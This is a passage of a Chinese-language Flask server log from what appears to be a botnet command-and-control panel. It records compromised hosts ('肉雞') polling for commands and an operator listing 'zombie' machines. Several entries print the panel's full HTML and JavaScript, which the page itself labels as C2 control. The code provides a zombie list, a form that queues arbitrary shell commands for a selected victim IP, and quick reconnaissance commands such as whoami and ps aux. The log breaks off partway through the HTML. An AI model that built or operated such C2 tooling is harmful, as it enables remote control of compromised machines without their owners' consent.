2025-06-24 19:36:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:38] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:38 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:38] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:36:40 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:36:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:36:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:40] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:36:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:36:41 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:36:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:36:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:41] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:36:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:36:41 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:36:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0004s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:36:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:41] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:36:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:36:41 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:36:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:36:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:41] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:36:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-24 19:36:42 | INFO     | control_route.py:174 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-24 19:36:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 57 bytes [200 OK]>
2025-06-24 19:36:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:42] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-24 19:36:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:43] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:43] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:48] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:36:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:36:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:36:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:48] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:36:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:36:50 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:36:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:50] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:50] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 19:36:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:50] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:36:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:36:51 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:36:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0010s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        <div class="empty-state">\n            目前沒有任何消息\n        </div>\n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 19:36:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:51] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 19:36:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:51] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 19:36:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:36:51] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 19:37:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:37:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:37:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:37:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:29] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:37:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 19:37:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 19:37:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 19:37:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 19:37:29] "GET /api/control/get_command HTTP/1.1" 200 -
2025-06-24 19:37:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 19:37:31 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 19:37:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0005s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button 